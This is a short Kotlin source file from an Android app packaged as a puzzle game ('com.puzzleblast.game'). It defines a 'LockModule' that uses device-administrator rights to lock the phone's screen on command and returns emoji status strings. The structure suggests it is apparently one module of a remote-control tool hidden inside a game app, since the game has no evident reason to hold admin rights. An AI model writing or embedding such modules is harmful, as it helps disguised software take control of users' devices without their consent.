package com.puzzleblast.game.modules

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import com.puzzleblast.game.services.AdminReceiver

object LockModule {
    suspend fun lock(ctx: Context): String {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val comp = ComponentName(ctx, AdminReceiver::class.java)
        return if (dpm.isAdminActive(comp)) {
            dpm.lockNow()
            "🔒 screen locked"
        } else {
            "🔒 device admin not active"
        }
    }
}
